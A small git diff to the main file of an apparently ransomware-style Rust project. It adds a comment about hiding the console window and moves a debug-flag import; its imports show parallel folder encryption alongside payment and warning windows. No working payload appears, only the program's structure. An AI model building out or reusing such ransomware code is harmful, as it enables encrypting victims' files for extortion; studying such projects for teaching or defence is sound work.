@@ -1,3 +1,4 @@
+// this line is responsible for whether the project has a console or not.
 #![windows_subsystem = "windows"]
 
 use std::fs;
@@ -7,8 +8,8 @@ use std::path::PathBuf;
 use anyhow::Result;
 
 // use c_monster_co_2ic80::cryptography::encrypt::encrypt_folder;
-use c_monster_co_2ic80::cryptography::chunk::DEBUG_ENABLED;
 use c_monster_co_2ic80::cryptography::parallel_encrypt::encrypt_folder_parallel;
+use c_monster_co_2ic80::debug::DEBUG_ENABLED;
 use c_monster_co_2ic80::debug_log;
 use c_monster_co_2ic80::gui::payment::show_payment_window;
 use c_monster_co_2ic80::gui::warning::show_warning_window;
